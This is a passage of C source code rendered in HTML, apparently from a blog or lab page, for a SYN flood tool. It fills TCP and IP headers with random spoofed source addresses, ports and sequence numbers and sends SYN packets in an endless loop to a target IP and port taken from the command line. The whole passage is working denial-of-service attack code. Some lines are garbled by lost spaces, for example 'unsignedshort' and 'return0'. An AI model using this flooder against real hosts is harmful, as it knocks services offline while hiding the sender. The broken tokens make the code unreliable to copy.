an><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/* TCP Header */</span><br><span class="line"></span><br><span class="line">struct tcpheader &#123;</span><br><span class="line"></span><br><span class="line">    u_short tcp_sport;               /* source port */</span><br><span class="line"></span><br><span class="line">    u_short tcp_dport;               /* destination port */</span><br><span class="line"></span><br><span class="line">    u_int   tcp_seq;                 /* sequence number */</span><br><span class="line"></span><br><span class="line">    u_int   tcp_ack;                 /* acknowledgement number */</span><br><span class="line"></span><br><span class="line">    u_char  tcp_offx2;               /* data offset, rsvd */</span><br><span class="line"></span><br><span class="line">#define TH_OFF(th)      (((th)-&gt;tcp_offx2 &amp;0xf0) &gt;&gt;4)</span><br><span class="line"></span><br><span class="line">    u_char  tcp_flags;</span><br><span class="line"></span><br><span class="line">#define TH_FIN  0x01</span><br><span class="line"></span><br><span class="line">#define TH_SYN  0x02</span><br><span class="line"></span><br><span class="line">#define TH_RST  0x04</span><br><span class="line"></span><br><span class="line">#define TH_PUSH0x08</span><br><span class="line"></span><br><span class="line">#define TH_ACK  0x10</span><br><span class="line"></span><br><span class="line">#define TH_URG  0x20</span><br><span class="line"></span><br><span class="line">#define TH_ECE  0x40</span><br><span class="line"></span><br><span class="line">#define TH_CWR  0x80</span><br><span class="line"></span><br><span class="line">#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line"></span><br><span class="line">    u_short tcp_win;                 /* window */</span><br><span class="line"></span><br><span class="line">    u_short tcp_sum;                 /* checksum */</span><br><span class="line"></span><br><span class="line">    u_short tcp_urp;                 /* urgent pointer */</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/* Psuedo TCP header */</span><br><span class="line"></span><br><span class="line">struct pseudo_tcp</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    unsigned saddr, daddr;</span><br><span class="line"></span><br><span class="line">    unsignedchar mbz;</span><br><span class="line"></span><br><span class="line">    unsignedchar ptcl;</span><br><span class="line"></span><br><span class="line">    unsignedshort tcpl;</span><br><span class="line"></span><br><span class="line">    struct tcpheader tcp;</span><br><span class="line"></span><br><span class="line">    char payload[1500];</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//#define DEST_IP    &quot;10.9.0.5&quot;</span><br><span class="line"></span><br><span class="line">//#define DEST_PORT  23  // Attack the web server</span><br><span class="line"></span><br><span class="line">#define PACKET_LEN1500</span><br><span class="line"></span><br><span class="line">unsignedshort calculate_tcp_checksum(struct ipheader *ip);</span><br><span class="line"></span><br><span class="line">/*************************************************************</span><br><span class="line"></span><br><span class="line">  Given an IP packet, send it out using a raw socket.</span><br><span class="line"></span><br><span class="line">**************************************************************/</span><br><span class="line"></span><br><span class="line">void send_raw_ip_packet(struct ipheader* ip)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    struct sockaddr_in dest_info;</span><br><span class="line"></span><br><span class="line">    int enable = 1;</span><br><span class="line"></span><br><span class="line">    // Step 1: Create a raw network socket.</span><br><span class="line"></span><br><span class="line">    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"></span><br><span class="line">    if (sock &lt; 0) &#123;</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, &quot;socket() failed: %s\n&quot;, strerror(errno));</span><br><span class="line"></span><br><span class="line">    exit(1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Step 2: Set socket option.</span><br><span class="line"></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line"></span><br><span class="line">    &amp;enable, sizeof(enable));</span><br><span class="line"></span><br><span class="line">    // Step 3: Provide needed information about destination.</span><br><span class="line"></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    // Step 4: Send the packet out.</span><br><span class="line"></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), 0,</span><br><span class="line"></span><br><span class="line">    (struct sockaddr *)&amp;dest_info, sizeof(dest_info));</span><br><span class="line"></span><br><span class="line">    close(sock);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************</span><br><span class="line"></span><br><span class="line">  Spoof a TCP SYN packet.</span><br><span class="line"></span><br><span class="line">*******************************************************************/</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line"></span><br><span class="line">   char buffer[PACKET_LEN];</span><br><span class="line"></span><br><span class="line">   struct ipheader *ip = (struct ipheader *) buffer;</span><br><span class="line"></span><br><span class="line">   struct tcpheader *tcp = (struct tcpheader *) (buffer +</span><br><span class="line"></span><br><span class="line">    sizeof(struct ipheader));</span><br><span class="line"></span><br><span class="line">   if (argc &lt; 3) &#123;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Please provide IP and Port number\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Usage: synflood ip port\n&quot;);</span><br><span class="line"></span><br><span class="line">    exit(1);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   char *DEST_IP   = argv[1];</span><br><span class="line"></span><br><span class="line">   int DEST_PORT   = atoi(argv[2]);</span><br><span class="line"></span><br><span class="line">   srand(time(0)); // Initialize the seed for random # generation.</span><br><span class="line"></span><br><span class="line">   while (1) &#123;</span><br><span class="line"></span><br><span class="line">    memset(buffer, 0, PACKET_LEN);</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 1: Fill in the TCP header.</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sport = rand(); // Use random source port</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_dport = htons(DEST_PORT);</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_seq   = rand(); // Use random sequence #</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_offx2 = 0x50;</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_flags = TH_SYN; // Enable the SYN bit</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_win   = htons(20000);</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sum   = 0;</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 2: Fill in the IP header.</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ver = 4;   // Version (IPV4)</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ihl = 5;   // Header length</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_ttl = 50;  // Time to live</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = rand(); // Use a random IP address</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(DEST_IP);</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_TCP; // The value is 6.</span><br><span class="line"></span><br><span class="line">    ip-&gt;iph_len = htons(sizeof(struct ipheader) +</span><br><span class="line"></span><br><span class="line">    sizeof(struct tcpheader));</span><br><span class="line"></span><br><span class="line">    // Calculate tcp checksum</span><br><span class="line"></span><br><span class="line">    tcp-&gt;tcp_sum = calculate_tcp_checksum(ip);</span><br><span class="line"></span><br><span class="line">    /*********************************************************</span><br><span class="line"></span><br><span class="line">    Step 3: Finally, send the spoofed packet</span><br><span class="line"></span><br><span class="line">    ********************************************************/</span><br><span class="line"></span><br><span class="line">    send_raw_ip_packet(ip);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsignedshort in_cksum (unsignedshort *buf, int length)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   unsignedshort *w = buf;</span><br><span class="line"></span><br><span class="line">   int nleft = length;</span><br><span class="line"></span><br><span class="line">   int sum = 0;</span><br><span class="line"></span><br><span class="line">   unsignedshort temp=0;</span><br><span class="line"></span><br><span class="line">   /*</span><br><span class="line"></span><br><span class="line">    * The algorithm uses a 32 bit accumulator (sum), adds</span><br><span class="line"></span><br><span class="line">    * sequential 16 bit words to it, and at the end, folds back all</span><br><span class="line"></span><br><span class="line">    * the carry bits from the top 16 bits into the lower 16 bits.</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">   while (nleft &gt; 1)  &#123;</span><br><span class="line"></span><br><span class="line">    sum += *w++;</span><br><span class="line"></span><br><span class="line">    nleft -= 2;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /* treat the odd byte at the end, if any */</span><br><span class="line"></span><br><span class="line">   if (nleft == 1) &#123;</span><br><span class="line"></span><br><span class="line">    *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line"></span><br><span class="line">    sum += temp;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /* add back carry outs from top 16 bits to low 16 bits */</span><br><span class="line"></span><br><span class="line">   sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);  // add hi 16 to low 16</span><br><span class="line"></span><br><span class="line">   sum += (sum &gt;&gt; 16);                  // add carry</span><br><span class="line"></span><br><span class="line">   return (unsignedshort)(~sum);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/****************************************************************</span><br><span class="line"></span><br><span class="line">  TCP checksum is calculated on the pseudo header, which includes</span><br><span class="line"></span><br><span class="line">  the TCP header and data, plus some part of the IP header.</span><br><span class="line"></span><br><span class="line">  Therefore, we need to construct the pseudo header first.</span><br><span class="line"></span><br><span class="line">*****************************************************************/</span><br><span class="line"></span><br><span class="line">unsignedshort calculate_tcp_checksum(struct ipheader *ip)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip +</span><br><span class="line"></span><br><span class="line">    sizeof(struct ipheader));</span><br><span class="line"></span><br><span class="line">   int tcp_len = ntohs(ip-&gt;iph_len) - sizeof(struct ipheader);</span><br><span class="line"></span><br><span class="line">   /* pseudo tcp header for the checksum computation */</span><br><span class="line"></span><br><span class="line">   struct pseudo_tcp p_tcp;</span><br><span class="line"></span><br><span class="line">   memset(&amp;p_tcp, 0x0, sizeof(struct pseudo_tcp));</span><br><span class="line"></span><br><span class="line">   p_tcp.saddr  = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line"></span><br><span class="line">   p_tcp.daddr  = ip-&gt;iph_destip.s_addr;</span><br><span class="line"></span><br><span class="line">   p_tcp.mbz    = 0;</span><br><span class="line"></span><br><span class="line">   p_tcp.ptcl   = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">   p_tcp.tcpl   = htons(tcp_len);</span><br><span class="line"></span><br><span class="line">   memcpy(&amp;p_tcp.tcp, tcp, tcp_len);</span><br><span class="line"></span><br><span class="line">   return  (unsignedshort) in_cksum((unsignedshort *)&amp;p_tcp,</span><br><span class="line"></span><br><span class="line">    tcp_len + 12);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
